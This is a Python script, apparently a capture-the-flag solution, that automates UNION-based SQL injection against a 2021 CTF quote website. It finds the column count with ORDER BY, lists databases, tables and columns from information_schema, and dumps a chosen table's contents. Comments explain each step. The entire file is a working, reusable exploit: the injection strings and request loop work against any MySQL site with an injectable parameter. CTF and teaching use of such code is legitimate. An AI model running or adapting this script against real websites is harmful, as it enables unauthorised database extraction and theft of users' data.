from bs4.element import SoupStrainer
import requests
from bs4 import BeautifulSoup

def findColumnsNumber(url):
    i = 1
    while(True):
        # Explaination: the order by will show us how much columns in the table
        # -- - is the sign of comment in mysql
        newUrl = url + f"order by {i}-- -"
        res = requests.get(newUrl)
        if 'not found' not in res.text:
            print(f"the columns number are: {i -1}")
            break
        i += 1

def findDatabases(url):
    # Explaination: UNION SELECT use to comibne results of 2 tables.
    # because the first one does not have results (id = -1) then we get only our result.
    # we select NULL beacuse NULL return nothing, and we need to select like the number of columns (3).
    # beacause only the second column show data we pick it.
    # group_concat will get all the results of the selected field in one line (because this website return only the first option).
    # information_schema.schemata is a default table in mysql that show us the databases.
    newUrl = url + "UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata-- -"
    res = requests.get(newUrl)
    soup = BeautifulSoup(res.text,'html.parser')
    databases = soup.find("p",{"class":"quote"}).get_text().replace('"','').replace("-","").replace("\n","").replace(" ","")
    print(f"available databases are: {databases}")

def findTablesInDatabase(url,database_name):
    # Explaination: concat use to print some columns in the same column.
    # char(32) == ' ' , it is used to seperate the columns from each other.
    # information_schema.tables is the default table in mysql that show us the tables.
    newUrl = url + "UNION SELECT NULL,group_concat(concat(table_schema,char(32),table_name)),NULL FROM information_schema.tables-- -"
    res = requests.get(newUrl)
    soup = BeautifulSoup(res.text,'html.parser')
    tables = soup.find("p",{"class":"quote"}).get_text().replace('"','').replace("=","").replace("\n","").split(",")
    tables_output = []
    for table in tables:
        if(database_name in table):
            tables_output.append(table.split()[1])
    print(f"available tables in {database_name} are: {', '.join(tables_output)}")

def findColumnsInTable(url,database_name,table_name):
    #Explaination: information_schema.columns is the default table in mysql that show us the columns.
    newUrl = url + "UNION SELECT NULL,group_concat(concat(table_schema,char(32),table_name,char(32),column_name)),NULL FROM information_schema.columns-- -"
    res = requests.get(newUrl)
    soup = BeautifulSoup(res.text,'html.parser')
    columns = soup.find("p",{"class":"quote"}).get_text().replace('"','').replace("=","").replace("\n","").split(",")
    columns_output = []
    for column in columns:
        if(database_name in column and table_name in column):
            columns_output.append(column.split()[2])
    print(f"available columns in table {table_name} in database {database_name} are: {', '.join(columns_output)}")


def findInfoFromTable(url,database_name,table_name,columns):
    add_to_url = "concat("
    for i in columns:
        add_to_url += f"{i},char(32),"
    add_to_url = add_to_url[:-1] + ")"
    newUrl = url + f"UNION SELECT NULL,{add_to_url},NULL FROM {database_name}.{table_name}-- -"
    res = requests.get(newUrl)
    soup = BeautifulSoup(res.text,'html.parser')
    info = soup.find("p",{"class":"quote"}).get_text().replace('"','').replace("=","").replace("\n","").replace(" ","").replace("-","").split(",")
    print(f"the information in the table is: {info[0]}")    

def main():
    url = "https://quotedb-web.2021.ctfcompetition.com/?id=-1 "
    findColumnsNumber(url)
    findDatabases(url)
    database_name = input("enter database name to search: ")
    findTablesInDatabase(url,database_name)
    table_name = input("enter table name to search columns in: ")
    findColumnsInTable(url,database_name,table_name)
    column_name = input("enter columns to search for in database: ")
    findInfoFromTable(url,database_name,table_name,[column_name])

if __name__ == '__main__':
    main()